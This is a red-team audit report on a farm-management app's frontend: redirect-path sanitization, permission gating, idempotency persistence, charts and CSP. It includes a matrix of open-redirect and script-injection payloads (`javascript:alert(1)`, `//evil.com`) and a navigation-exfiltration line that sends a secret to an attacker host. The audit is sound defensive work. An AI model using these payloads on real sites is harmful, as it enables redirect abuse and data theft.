# Red Team Audit — Part Q: Frontend Cross-Cutting Libs & Components (Q1–Q11)

Date: 2026-09-13
Scope: `audit_reports/2026-09-13/00_RED_TEAM_AUDIT_SCOPE.md` Part Q (Q1–Q11).
Auditor method: every in-scope file read in full (including `idempotent-request.ts` 514 L, `remote-picker.tsx` 512 L, `charts.tsx` 460 L), then attacked as an adversary: path-canonicalization bypass attempts (empirically executed, not just read), permission-map coverage proofs against the real route tree and OpenAPI contract, mirror-drift comparison against the backend endpoints being mirrored, concurrency/TOCTOU reasoning on every async fence, and persistence/signature abuse scenarios for the idempotency registry.

## Verdict up front

**No Critical and no High findings.** The `safeAppPath` chokepoint survived a
66-case crafted bypass matrix plus a 200,000-case structured fuzz with **zero
off-origin survivors** (matrix below). The permission-navigation chain fails
closed at every unenumerated edge. The idempotency signature model held against
every cross-user/cross-token/reload scenario attempted. What remains is one
Medium (client mirror drift vs the backend skip gates — server enforcement
holds), two Low (hardening), and four Info observations.

---

## Findings

| ID | Severity | Unit | Title |
|----|----------|------|-------|
| RT-Q-1 | Medium | Q2 | `taskSkipUnavailable` mirrors only 2 of the backend's 3 deterministic-409 skip gates — pending-ULTRASOUND un-skippability is un-mirrored |
| RT-Q-2 | Low | Q4 | A flood of ≥128 distinct protected mutations inside the TTL window evicts the persisted recovery digest of an ambiguous (possibly committed) send |
| RT-Q-3 | Low | Q10 | `Donut` renders `NaN` dash arrays for ±Infinity slice values (display hardening; unreachable via the JSON API) |
| RT-Q-4 | Info | Q5 | `/api/planner/plans` absent from `FARM_DATA_PATHS` — an undocumented exclusion parallel to the deliberate scenario exclusion |
| RT-Q-5 | Info | Q11 | CSP `script-src 'unsafe-inline'` is a documented, currently unfixable residual XSS amplifier; navigation-based exfil is outside CSP's power |
| RT-Q-6 | Info | Q1 | `/breeding/[id]/ultrasound` accepted as a returnTo with `breeding.view` only — asymmetric with the three manage-route entries, but the target is a pure redirect shim |
| RT-Q-7 | Info | Q4 | Exported `clearIdempotencyRequestState` (realm-only variant) is dead in production code |

### RT-Q-1 — Medium — Q2 — Skip-availability mirror drift: pending-ULTRASOUND gate missing

**Evidence**
- Client mirror: `frontend/src/lib/task-action-access.ts:29-35` — `taskSkipUnavailable` returns true only for (a) `auto_generated && purchase_batch_id !== null` and (b) `auto_generated && (WEANING|BUCKET_MOVE) && animal_id !== null`.
- Sole consumer gate: `frontend/src/app/(app)/tasks/page.tsx:412` — `{!lockedFutureRecurrence && !taskSkipUnavailable(task) && (… Skip …)}`. No other ULTRASOUND skip handling exists on the page (grep confirms zero `ULTRASOUND` references in `tasks/page.tsx`).
- Server truth: `backend/app/api/tasks.py:680-705` — a third deterministic 409: `task.auto_generated && category == ULTRASOUND` with a still-PENDING breeding outcome and an active linked doe cannot be skipped ("the pregnancy check closes an open service").
- The `taskSkipUnavailable` docstring (`task-action-access.ts:14`) claims to mirror "the deterministic 409 gates in backend `api/tasks.py::skip`" — it mirrors two of three.

**Exploit sketch / impact**
An operator opens a pending generated ULTRASOUND duty. The board offers Skip
(the client mirror does not classify it as unavailable). Tapping Skip dispatches
`POST /api/tasks/{id}/skip`, which deterministically returns 409; the user sees
an error toast instead of a grayed-out control. This is mirror *drift* per the
audit rubric, not an authorization bypass: the server gate is intact, and the
drift direction is "offer an action certain to fail", never "hide a required
action" or "enable a forbidden one". Impact is worker-facing UX honesty on the
exact duty class (pregnancy checks) where a stranded doe is the backend's stated
concern.

**Fix**
Extend the mirror with the same fail-closed approximation already used for
BUCKET_MOVE (which also cannot distinguish flavors client-side and deliberately
over-grays): `task.category === "ULTRASOUND" && task.animal_id !== null && task.auto_generated` → unavailable. `TaskOut` carries `category` and `animal_id`, so the mirror has everything it needs (exact mirroring is impossible because `TaskOut` lacks the breeding outcome; approximate fail-closed mirroring is the established pattern in this file).

### RT-Q-2 — Low — Q4 — Persisted-digest flood eviction can strand an ambiguous send's recovery key

**Evidence**
- `frontend/src/lib/idempotent-request.ts:124-127` — `readPersistedRecords` sorts by `expiresAt` descending and slices to `MAX_LOGICAL_REQUESTS` (128): oldest-expiry-first eviction.
- `idempotent-request.ts:143-152` — `persistKey` unshifts every new logical request into the same bounded store before its fetch starts ("The record is durable before fetch starts").
- In contrast, the **in-memory** registry explicitly refuses to evict in-flight work: `makeRoom()` (`idempotent-request.ts:361-370`) deletes only settled entries and throws "Too many protected mutations are already in flight" at 128 in-flight — in-flight coalescing is never silently degraded.

**Exploit sketch**
Same tab, ≤120 s window: trigger ≥128 *distinct* protected mutations (distinct
URL+body is enough; e.g. scripted dispense lines). Each `persistKey` write
pushes the oldest persisted digests out of the 128-slot store — including the
digest of a request whose response never arrived. Reload within the 2-minute
TTL, retry the same logical mutation: digest miss → `randomIdempotencyKey()` →
new key → if the original send actually committed on the server, the retry
duplicates the stock/money effect (bounded by the server-side idempotency
record TTL for the *old* key, which no longer helps because the client sent a
new one).

**Impact**
Low in practice: requires 128 distinct writes inside two minutes in one tab
(single-flight and dialog gating make this non-trivial through the UI), an
ambiguous failure on one of them, and a reload-and-retry before TTL. The exact
scenario cross-reload persistence exists for is only defeated under flood.

**Fix**
Track persisted digests whose logical request is still in flight (or whose
outcome is unknown) and exempt them from the eviction slice — mirror the
in-memory `makeRoom` policy in `readPersistedRecords`/`persistKey` (evict only
records known-settled, or known-oldest settled).

### RT-Q-3 — Low — Q10 — Donut NaN dash arrays for ±Infinity slices

**Evidence**
- `frontend/src/components/charts.tsx:114` — `total = slices.reduce((sum, s) => sum + s.value, 0)`: a single `Infinity` slice makes `total === Infinity`; `total > 0` (line 147) then admits rendering.
- `charts.tsx:149-164` — `fraction = Infinity/Infinity = NaN`, `dash = NaN`, `strokeDasharray="NaN …"` (invalid SVG → slivers render as a solid/absent ring); the `aria-label` (line 131) also interpolates `"Infinity"`.
- Verified numerically in Node: `[Infinity, 50] → total Infinity, fractions [NaN, 0]`. A `NaN` slice is already invisible-safe (`NaN > 0` false, and NaN poisons `total` to NaN → `total > 0` false → "No data").

**Impact**
Display-only. Unreachable through the API: JSON cannot encode ±Infinity/NaN and
the backend's non-finite json-safety guard (M9) blocks them at the wire;
reachable only if a future caller computes a derived slice with bad math.

**Fix**
Filter `!Number.isFinite(slice.value)` alongside `value > 0` in `visibleSlices`
(and out of `total`), same as Sparkline (line 28) and Histogram (line 297) already do.

### RT-Q-4 — Info — Q5 — `/api/planner/plans` outside `FARM_DATA_PATHS`

**Evidence**: `frontend/src/lib/query-invalidation.ts:14-33` lists 11 prefixes
plus the herd-snapshot special case. OpenAPI has `/api/planner/plans` and
`/api/planner/plans/{plan_id}`, consumed cached by
`frontend/src/app/(app)/planner/page.tsx:466` (`useListPlansApiPlannerPlansGet`).
The module comment names only "defaults and saved scenarios" as deliberate
exclusions.

**Assessment**: safe as-is. Saved plans are user-authored documents with a
server-side revision/409 stale-plan flow (P16), so invalidating them on every
herd mutation would be wrong for the same reason scenarios are excluded.
Cross-farm safety does not depend on this list at all: `selectFarm` performs
`queryClient.cancelQueries(); queryClient.clear()` (`frontend/src/lib/auth-context.tsx:178-179`)
before installing the new farm id, so every farm-scoped cache entry — scenarios,
plans, permissions — dies on every farm switch. Verified reasoning; recommend
adding `/api/planner/plans` to the documented exclusion list (or a comment) so
the omission reads as intent, not oversight.

### RT-Q-5 — Info — Q11 — CSP quality (honest assessment)

`frontend/next.config.ts:25-36`. Enforced and good: `default-src 'self'`,
`connect-src 'self'` (blocks `fetch`/XHR exfil from any injected script),
`object-src 'none'`, `base-uri 'self'` (no `<base>` hijack), `form-action 'self'`
(no form-post exfil), `frame-ancestors 'none'` + `X-Frame-Options: DENY`
(double clickjacking defense), `img-src 'self' data:` / `font-src 'self' data:`
(`data:` is not a remote exfil channel). Residual, documented in-config:
`script-src 'self' 'unsafe-inline'` — the App Router streams inline RSC/hydration
scripts and Next 16 does not propagate a nonce to them in standalone output (the
comment records a verified nonce attempt that broke hydration). Any future XSS
is therefore unamplified-by-CSP for script execution; note that *navigation*
exfil (`location = 'https://attacker/?' + secret`) remains possible from an
injected inline script — no CSP directive constrains navigation today. HSTS
(2 y, includeSubDomains) is prod-only, which is correct for the http dev loop.
Headers apply to `/:path*` (all routes, including proxied `/api`).

### RT-Q-6 — Info — Q1 — `/breeding/[id]/ultrasound` returnTo needs only `breeding.view`

**Evidence**: `MANAGE_ROUTE_PERMISSIONS`
(`frontend/src/lib/permission-navigation.ts:53-57`) gates `/animals/new`,
`/health/new`, `/kidding/new` at create/manage permissions; the ultrasound shim
route has no manage entry and resolves under the plain `/breeding` root
(`breeding.view`). The shim (`frontend/src/app/(app)/breeding/[id]/ultrasound/page.tsx`)
is a pure redirect to `/breeding?ultrasound_id=…`; the breeding page gates the
dialog and every write by `breeding.manage`, and the server re-checks. No data
exposure; recorded because the asymmetry with the three real manage routes is
deliberate-looking but undocumented.

### RT-Q-7 — Info — Q4 — Dead export `clearIdempotencyRequestState`

**Evidence**: `idempotent-request.ts:498-500` exports the realm-only clear;
grep shows no production call site. The real teardown path
(`auth-context.tsx:200`, inside `clearSession` shared by signOut **and** the
forced-logout path) calls `clearPersistedIdempotencyRequestState`, which clears
realm memory *and* sessionStorage. Harmless; either delete the export or keep it
pinned by tests as the documented realm-only variant.

---

## Q8 — `safeAppPath` bypass-attempt matrix (the chokepoint)

Method: the exact production function (copied verbatim from
`frontend/src/lib/utils.ts:13-37`) executed under Node 22 (WHATWG URL) against
every attack class in the brief, plus a 200,000-iteration structured fuzz over
`"/" + [a-zA-Z0-9\-._~!$&'()*+,;=:@/?#[]%\\^|{}"'<>` + C0/DEL/NBSP/fullwidth-dot/fullwidth-slash/BOM/U+2028/RLO]"
random suffixes. A "PASS" means safeAppPath returned non-null; the navigated
origin was then computed with `new URL(result, "https://goatfarm.invalid")`.

| Input class | Examples | Result | Why it holds |
|---|---|---|---|
| Absolute-scheme URLs | `http://evil.com`, `https://evil.com/x`, `mailto:`, `javascript:alert(1)`, `data:…`, `JAVASCRIPT:`, `" javascript:"` (leading space) | rejected | none start with `/` |
| Protocol-relative | `//evil.com/x`, `//`, `///x` | rejected | `startsWith("//")` |
| Backslash host smuggling | `/\evil.com/x`, `/\\evil.com`, `/\n/evil.com`, `/\t/…`, `/\r/…` | rejected | `\` and all C0 controls matched by `/[\\\u0000-\u001F\u007F]/` (tab/LF/CR are stripped by URL parsing; the regex catches them first) |
| NUL / DEL | `/\u0000evil.com`, `/\u007f/x` | rejected | same control-char class |
| Dot segments | `/./finance`, `/../finance`, `/tasks/../finance`, `/tasks/.`, `/tasks/..`, `/..`, `/../..` | rejected | URL normalizes pathname → `parsed.pathname !== rawPathname` |
| Percent-encodings in pathname | `/%2e%2e%2f`, `/%252e%252e` (double), `/%c0%af` (overlong), `/%2F%2Fevil.com`, `/%2e/`, `/%2E%2E/` (upper), `/%5c`, `/%2fpath` | rejected | blanket `rawPathname.includes("%")` before parsing — encoding case/depth is irrelevant |
| Unicode dots/slashes | `/animals．./x` (U+FF0E), `/animals。x`, `/animals／x`, `/a／/b` (U+FF0F) | rejected | WHATWG serialization percent-encodes non-ASCII in pathname → equality check fails |
| Whitespace/BOM/format chars | `" /path"`, `"/ path"`, `"/path "`, `"/pa th"`, `/path%20` (in path), `/\u00a0x`, `/x\u00a0`, `/\ufeffx`, `/x\u2028`, `/x\u202e` (RLO) | rejected | leading-space fails `startsWith("/")`; interior space/NBSP/BOM get percent-encoded → mismatch; `%`-forms hit the percent ban |
| Query/hash-borne payloads | `/tasks?returnTo=//evil.com`, `/tasks?returnTo=https://evil.com`, `/tasks?x=%2f`, `/tasks#%2e%2e` | **PASS, same-origin** | percent signs are allowed only after the first `?`/`#`; the query never influences origin or pathname; downstream consumers re-validate nested `returnTo` at use time (see Q1) |
| Trivial | `""`, `#frag`, `?q=1` | rejected / rejected / rejected | empty falsy; `#`/`?` lack the leading slash |
| Path oddities that DO pass | `/#frag`, `/?q=1`, `/tasks?a=1#b`, `/tasks//finance`, `/PATH`, `/tasks;x`, `/[evil]`, `/path\|pipe` | **PASS, same-origin** | stay on the validation origin; `/tasks//finance` keeps an empty segment (no module impersonation: route/action matchers use exact-or-`root + "/"` prefix); `;`, `[`, `|` are not URL separators and match no route root → fail closed downstream |

**Fuzz outcome: 40,445 strings passed safeAppPath; 0 resolved off-origin.**

Adversarial reading of the canonicalization-drift check confirms the empirical
result: for input forced to start with a single `/`, the only byte sequences
that can change the *host* during URL parsing are `\` (path-separator on special
schemes), `//` after the slash, and stripped controls — each individually
banned; every other mutation (percent-encoding, dot-segment removal,
non-ASCII encoding, space encoding) is caught by the strict
`parsed.pathname === rawPathname` invariant, which is stricter than an
origin-only check. **Held.**

---

## Per-unit attacked-&-held notes

### Q1 — Client permission system
- `use-permissions.ts:37-40` — fail-closed verified: on `isError` the payload is dropped (`!query.isError && status === 200`), so a background-refetch failure cannot keep a revoked grant navigable from stale cache. `loading` includes `farmId === null` (query disabled window) so the disabled-with-empty-set window renders skeleton, not denial. `isOwner` defaults false on error.
- Cross-farm cache poisoning impossible: query keys are URL-only, but `selectFarm` does `cancelQueries()` then `clear()` before the new farm id is installed (`auth-context.tsx:178-182`), killing in-flight old-farm responses and the old permission payload together; `applyFarmList`'s lose-last-membership branch clears identically.
- `permission-envelope.ts` — `fetchQuery` on the identical generated key the shell observer uses; login/farm-select landing therefore reuses the post-clear fresh entry; the `status !== 200` branch is type-narrowing only (non-2xx rejects before an envelope exists).
- `resolveAppPath` chain (`permission-navigation.ts:85-113`): safeAppPath → `%`/`\` re-check (defense-in-depth, unreachable) → `path !== rawPath` canonical-spelling-only rule (kills `/tasks/../animals` even though it normalizes *into* a permitted module — pinned by `permission-navigation.campaign.test.ts:19-21`) → manage-route permission (checked first; a special route without its create/manage permission returns null even if the module view permission exists) → app-route permission; no route → null (fail-closed to fallback).
- `APP_ROUTE_PERMISSIONS` coverage proven against the real route tree (29 `page.tsx`/`route.ts` files enumerated): every `(app)` module root (dashboard, animals, buckets, breeding, kidding, health, feeding, purchases, tasks, finance, planner, simulation, ops-simulation, reports, team) is present; the only unlisted in-app page is `/no-access` itself (correctly unresolvable as a returnTo). Prefix matching is exact-or-`root + "/"` — `/animalsx`-style prefix collisions match nothing (pinned in `query-invalidation`-style tests and by inspection of `path.startsWith(\`${root}/\`)`).
- `FARM_AGNOSTIC_SUBROUTES` (`:62-68`) exactly equals the set of id-free subroutes in the route tree (`/animals/new`, `/feeding/inventory`, `/feeding/recipes`, `/health/new`, `/kidding/new`). Record-id URLs degrade: `/animals/7 → /animals`, `/health/schedule/45 → /health`, `/breeding/7/ultrasound → /breeding` (not agnostic → falls to root; trailing-slash variants like `/animals/` are first normalized to the root spelling and keep their query — `:146-157`).
- `permittedAppPath` (same-farm returnTo) keeps record ids intact — correct, the farm never changed. `permittedAppPathFromList` (login + farm-select) is the only cross-farm shape and uses the plain permission list from `/api/auth/permissions`.
- `withReturnTo` does not validate its `returnTo` by design; **every consumer validated at use time** (grep-complete): `login/page.tsx:108`, `farm-select/page.tsx:110`, `health/page.tsx:444`, `animals/[id]/page.tsx:1559`, `health/schedule/[animalId]/page.tsx:86` — each passes `searchParams.get("returnTo")` through `permittedAppPath(FromList)` before navigation; remaining `withReturnTo` call sites inject app-owned literals or already-validated paths (tasks page composes `returnTo` from its own `pathname` + params).
- `firstPermittedPath` fails closed to `/no-access` when nothing in the landing list is held; the landing list deliberately omits `/dashboard` primacy (custom roles need not include it).
- `permission-gate.tsx` is presentational and ordered loading → error (`PermissionsError` retry) → denial → children; it cannot fail open.

### Q2 — task-action-access
- `permittedTaskActionPath` (`task-action-access.ts:53-75`): `action_url` treated as untrusted. safeAppPath first (kills every path-borne encoding); then a whole-string `/%(?:2e|2f|5c)/i` rejection — note this effectively only guards the query/hash remainder (safeAppPath already bans all `%` in pathnames), which is why double-encoded `%252e` (not matched by the regex, not percent-decoded by any later `Link`) is inert: it survives only as a literal query-string value on an already-root-matched path. Upper/mixed case covered by `/i`. Unknown roots (`/finance/...`, `/tasks/...`, bare `/`) fall through to `return null` — fail-closed allowlist of exactly breeding/kidding/health, each gated on its `.manage` permission.
- Skip-mirror: batch-linked and WEANING/BUCKET_MOVE+animal gates verified against `backend/app/api/tasks.py:646-679` — the client is deliberately *stricter* than the server in both (batch gate assumes a live batch because the server sweeps empty ones; RECOVERY-flavor detection is approximated by category+linkage because `TaskOut` has no bucket state), which is the safe drift direction. The one un-mirrored gate is RT-Q-1 (pending-ULTRASOUND).
- `taskFormNotDueYet` string comparison is sound for `YYYY-MM-DD`; callers pass `farmToday()` (`tasks/page.tsx:1282` → `format.ts:86-88`, farm-timezone-aware, guarded `Intl` fallback to `Asia/Kolkata`), matching the backend's `today(farm.timezone)` — no client-clock timezone skew class beyond the shared farm-zone definition, and a wrong "not due yet" only hides a form early (the server's 409 is the real gate).
- `captureFarmScope()` consumers verified: 42 call sites, each capturing the epoch synchronously *before* `mutateAsync` (spot-verified in tasks/feeding pages) — no read-after-await TOCTOU.

### Q3 — farm-scope-guard + use-single-flight
- `farm-scope-guard.ts:15-18` captures `farmScopeEpochValue()` synchronously at creation; `setCurrentFarmId` (`api-client.ts:93-96`) bumps the epoch on every farm change. Write-continuation fences compare at continuation time — exactly the documented contract; the request itself is safe independently (X-Farm-Id captured per request in `rawFetch`).
- `use-single-flight.ts:27-38` sets `active.current = true` synchronously before the first `await` — the same-render double-click gap is closed; `pending` then holds controls disabled across renders; `mounted` guard restores correctly across Strict Mode rehearsal. No re-entrancy path found (the `run` callback closes over refs only).

### Q4 — idempotent-request.ts
- **Persistence shape validation is strict** (`:101-115`): `version === 1`, digest must match full-lowercase-hex SHA-256 (regex), key must be a canonical UUID v4 (version nibble + variant nibble enforced), `expiresAt` finite, unexpired, and not beyond `now + TTL` (kills clock-rollback-forged stamps); dedupe by digest; anything else silently dropped; a non-array/oversized (>64 KiB raw) or unparseable store is wiped. Version field future-proofs re-interpretation.
- **Capacity**: 128 logical in-memory; `makeRoom` never evicts in-flight (throws at 128 in-flight instead) — in-flight key coalescing cannot be flooded away. Persisted store: 128 records, oldest-expiry-first eviction (see RT-Q-2 for the flood caveat).
- **Digest/signature model held against every scenario in the brief**:
  - *Post-reload retry, same user + farm + body*: `persistentSignature` (`:298-321`) = version + method + `actorScope` (JWT `sub`, parsed in `api-client.ts:52-68`) + `farmScope` + URL + body + caller headers (minus `Idempotency-Key`). Crucially the **Authorization header is injected in `rawFetch` (`api-client.ts:620-622`), i.e. inside `execute`, after the signature is computed** — so a post-reload token refresh does not change the digest; the same key is recovered. Verified wiring.
  - *Logout then different user, same tab*: `clearSession` (shared by signOut and forced logout) calls `clearPersistedIdempotencyRequestState` (`auth-context.tsx:200`) which clears realm memory *and* the store — and even without that clear, a different `sub` produces a different digest (no collision) and the backend namespaces keys by actor independently (comment `:306-309`).
  - *Opaque/non-JWT token*: `actorScope` null → `persistedDigest` null → memory-only (`:419`) — no key a later login could claim.
  - *Password route carve-out*: `allowsPersistedRecovery` excludes exactly `/api/team/workers` (`:235-237`) — the body digest would be an offline password verifier; in-memory coalescing + one automatic retry still apply.
- **One automatic retry** (`:372-382`): fires only for non-HTTP, non-abort failures and re-executes with the *same* `preparedInit` (same `Idempotency-Key` header) — verified. HTTP-status errors and aborts propagate immediately (abort → key *retained* for explicit replay, `shouldRetainForExplicitRetry` has no status → retain).
- **Success completeness**: `apiResponseOnce` buffers and JSON-validates successful bodies for protected mutations before the registry deletes the key (`api-client.ts:767-773` + `cloneResult`) — a truncated 200 stays ambiguous and retries with the same key.
- **AbortSignal conflict** (`:429-441`): joining an in-flight logical request requires the identical signal; a different signal throws `ProtectedMutationSignalConflictError` instead of silently ignoring or cross-cancelling. Settled entries adopt the new signal explicitly (`:463`). The registry critical section (`:425-470`) is fully synchronous — no await between lookup and `promise` assignment, so no join race.
- **Ownership fence**: `assertRequestScope` runs at entry and after the only pre-registry await (SHA-256) — a logout during digest computation cannot re-arm the previous actor's key.
- **Randomness**: `randomUUID` preferred; manual v4 fallback (`:246-251`) uses `getRandomValues` (unbiased) and correctly forces version/variant nibbles.
- Route table `isIdempotencyProtectedMutation` (`:196-225`) cross-checked against OpenAPI: covers both server-*required*-key money routes (`/api/finance/new`, `/api/feeding/dispense`) and the accept-key stock/breeding/kidding/creation routes; regexes are digit-anchored. Status-change/move cascades are excluded but are server-side state-machine-idempotent (replay hits "not ACTIVE").

### Q5 — query-invalidation
- `FARM_DATA_PATHS` + the herd-snapshot special case cross-checked against the full OpenAPI path list: every farm-scoped read path is covered via exact-or-prefix (`/api/dashboard/reports` covered by the `/api/dashboard` prefix; `/api/health/schedule/{id}`, `/api/breeding/candidates`, `/api/purchases/{id}` etc. by their prefixes). Auth paths and simulation defaults/calibration correctly excluded; scenarios deliberately excluded (draft-overwrite rationale in the module comment) — safe *because* they are user-authored documents, and cross-farm-safe only due to the `selectFarm` full clear (verified: that reasoning in the audit brief is correct — `auth-context.tsx:178-179`). Herd-snapshot explicitly included (`:31`). Only undocumented omission: `/api/planner/plans` (RT-Q-4).
- Prefix matching is `path === prefix || startsWith(prefix + "/")` — `/api/animalsx` cannot match (pinned by test).

### Q6 — use-url-state + persisted-numbers + backend-caps
- `use-url-state.ts`: the pending-querystring latch (`:34, :93`) composes same-tick `set()` calls (filter + offset reset) off the newest uncommitted base; any committed `paramsKey` movement — own write or external back/forward — clears the latch in the effect, so external navigation resets the composition base instead of being clobbered. Pages adopt external changes via the returned committed `qs` compare ("the change I initiated" protocol).
- `getNumber` (`:50-64`): missing/empty → fallback (explicit `Number(null)===0` trap avoided), non-finite → fallback, `Math.trunc` then clamp to [min,max] — fractional offsets truncate to 0-floor at callers (all pagination callers pass min 0, max `MAX_PAGE_OFFSET`; grep-verified across animals/health/feeding/purchases pages). `MAX_PAGE_OFFSET = 1_000_000` mirrors `backend/app/schemas/common.py:23` exactly (verified); animals page also carries a local copy plus a derived `MAX_PAGE` (documented there, same value).
- `persisted-numbers.ts`: `isPersistableNonnegativeWeight(0) === true` is deliberate (zero is meaningful for optional fields); these are display/form guards only — the server enforces its own precision floors and caps. `formatPersistedKg` guards non-finite → "—".
- `backend-caps.ts`: parity pinned by `backend-caps.test.ts` reading `shared/openapi.json` schema bounds directly (spot-verified: tag 50, recur 3650, batch 1000, withdrawal 730, free-text 4000).

### Q7 — i18n
- Fallback chain `te → en → key` (`i18n/index.tsx:45-52`); `te` typed `Partial<Record<MessageKey, string>>` so untranslated keys render English, never raw codes; a typo'd key renders the key itself (visible-in-review choice). Interpolation uses `hasOwnProperty` and `String()` — values are rendered by React callers (no HTML sink; no `dangerouslySetInnerHTML` anywhere in `frontend/src` outside tests).
- Storage: `localStorage['herdly.language']`, values constrained to the literal `"te"`/`"en"` on read (`:72-81`) — no sensitive data, no parser surface. Hydration-safe (SSR English, adopt-after-mount), `document.documentElement.lang` kept truthful. `enum-labels` Telugu map is partial-by-design with English fallback (never raw codes).

### Q9 — Pickers
- `remote-picker.tsx`: 300 ms debounce keyed *into the query key* (`[sourcePath, "remote-picker", ...cacheKey, debouncedSearch, pageSize]`) — each term is its own cache entry, so an older response cannot overwrite a newer term's list; `keepPreviousData` renders the previous entry only while the new key is pending, and `awaitingCurrentTerm` additionally freezes Load-more against the un-debounced raw input (`:309`). Page size is internal, clamped 10–100 (`:105-109`), never URL-driven. `getNextPageParam` requires `nextOffset > lastPageParam && nextOffset < total` — no unbounded/infinite pagination from a misbehaving page. Static-option merge dedupes by value both directions (`:289-300`).
- `animal-picker.tsx`: eligibleIds cache key is the canonically sorted id list (`:101-106`) — set-equal pickers share a cache, differently-filtered ones cannot cross-contaminate. Prefill uses the farm-scoped profile endpoint; a cross-farm id 404s uniformly → empty label fallback `Selected item <value>` (React-escaped) — no cross-farm oracle.
- `health-target-pickers.tsx`: `#id` exact resolution double-checks the returned record id equals the requested id (`.find(a => a.id === selectedId)`, `:76`, `:164`) — a fuzzy match on `#5` cannot smuggle a different animal's label. Server-side search is farm-scoped (F1) — 404-uniform across farms.

### Q10 — Display components
- `charts.tsx`: no `dangerouslySetInnerHTML` (grep-clean codebase); all SVG geometry is computed from numbers (`width/height` constants; only `<title>`/`aria-label` interpolate data, React-escaped). Sparkline filters non-finite and requires ≥2 points (`:28-48`); Histogram filters non-finite bins and clamps marker X into `[pad, width-pad]` with a domain sanity check (`:301-306`); BarList scales by `Math.abs` with non-finite mapped to 0 in the max and negative values still visible via tone (`:220-233`). Donut: negative and NaN slices invisible-safe; ±Infinity is RT-Q-3.
- `pagination-controls.tsx`: `sanitizeOffset` truncates NaN/negative/fractional to a whole non-negative int; `safeLimit ≥ 1`; range clamped so the label cannot invert; control never fabricates totals.
- `status-badge.tsx` normalizes before lookup (no injection surface; unknown → neutral). `stale-data-notice`, `data-table-card`, `empty-state`, `stat-card`, `feeding-nav` are presentational, React-escaped, static hrefs.

### Q11 — next.config.ts
- `assertSafeBackendUrl` (`backend-rewrites.ts:12-41`): https always allowed; http only for loopback spellings or a single-label `[a-z][a-z0-9-]*` host (no dots/colons → not reachable from outside the compose bridge). `BACKEND_URL` is a build/server-start environment variable (`next.config.ts:60`), not runtime-user-controllable — an attacker who controls it already controls the deployment (R3's domain). Proxy is same-origin (`/api/:path*` → `${backendUrl}/api/:path*`), carrying the bearer token and httpOnly refresh cookie only over the project-private network; cookies stay first-party (no CORS surface). Path traversal through `:path*` is neutralized by URL normalization on both Next and FastAPI sides, and the destination prefix is fixed (no host escape).
- Rewrites expose only `/healthz`, `/readyz`, `/api/*` — `/metrics` is *not* proxied to the browser origin (M8 boundary preserved). `poweredByHeader: false`; headers on `/:path*`; CSP/HSTS assessment at RT-Q-5.

---

## Test-coverage note

Colocated suites were consulted where behavior was non-obvious and are accurate
to the code: `permission-navigation.campaign.test.ts` (encoded/dot-segment
rejections, query preservation), `query-invalidation.test.ts` (prefix matching,
deliberate exclusions), `idempotent-request.persistence.test.ts` (record shape,
TTL, caps), `backend-caps.test.ts` (OpenAPI parity). No finding in this report
contradicts a pinned test; RT-Q-1 is untested drift (the skip-mirror suite pins
the two mirrored gates only).

## Summary counts

Critical 0 · High 0 · Medium 1 (RT-Q-1) · Low 2 (RT-Q-2, RT-Q-3) · Info 4 (RT-Q-4 … RT-Q-7).
